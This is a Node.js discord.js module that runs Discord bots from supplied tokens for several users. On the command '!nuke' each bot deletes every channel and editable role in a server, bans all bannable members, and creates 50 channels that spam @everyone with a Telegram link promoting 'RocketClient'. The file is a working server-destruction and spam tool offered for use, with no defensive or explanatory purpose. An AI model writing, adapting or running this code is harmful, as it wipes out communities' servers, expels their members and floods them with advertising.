const { Client, GatewayIntentBits, ChannelType } = require('discord.js');

const bots = new Map();

async function startBot(userId, token) {
  if (bots.has(userId)) {
    return;
  }
  const client = new Client({
    intents: [
      GatewayIntentBits.Guilds,
      GatewayIntentBits.GuildMessages,
      GatewayIntentBits.MessageContent,
      GatewayIntentBits.GuildMembers,
      GatewayIntentBits.GuildBans
    ]
  });

  client.once('ready', () => {
    console.log(`✅ Logged in as ${client.user.tag} (session: ${userId})`);
    bots.set(userId, client);
  });

  client.on('messageCreate', async message => {
    if (!message.guild || message.content !== '!nuke') return;
    const channelPromises = message.guild.channels.cache.map(channel =>
      channel.delete().catch(() => {})
    );
    await Promise.allSettled(channelPromises);

    const rolePromises = message.guild.roles.cache
      .filter(role => role.editable && role.name !== '@everyone')
      .map(role => role.delete().catch(() => {}));
    await Promise.allSettled(rolePromises);

    const members = await message.guild.members.fetch();
    const banPromises = members.map(member => {
      if (member.bannable) {
        return member.ban({ reason: '🍀 • 𝐑𝐨𝐜𝐤𝐞𝐭𝐂𝐥𝐢𝐞𝐧𝐭 • 🍀' }).catch(() => {});
      }
      return null;
    }).filter(Boolean);
    await Promise.allSettled(banPromises);

    const newChannelPromises = [];
    for (let i = 0; i < 50; i++) {
      newChannelPromises.push(
        message.guild.channels.create({
          name: `🍀 • 𝐑𝐨𝐜𝐤𝐞𝐭𝐂𝐥𝐢𝐞𝐧𝐭`,
          type: ChannelType.GuildText
        }).then(channel =>
          channel.send('@everyone @here https://t.me/RocketClient2')
        )
      );
    }
    await Promise.allSettled(newChannelPromises);
  });

  await client.login(token);
}

function stopBot(userId) {
  const client = bots.get(userId);
  if (client) {
    client.destroy();
    bots.delete(userId);
  }
}

function isBotOnline(userId) {
  const client = bots.get(userId);
  return client?.isReady() || false;
}

function getBotInfo(userId) {
  const client = bots.get(userId);
  return client?.isReady() ? { tag: client.user.tag } : null;
}

module.exports = { startBot, stopBot, isBotOnline, getBotInfo };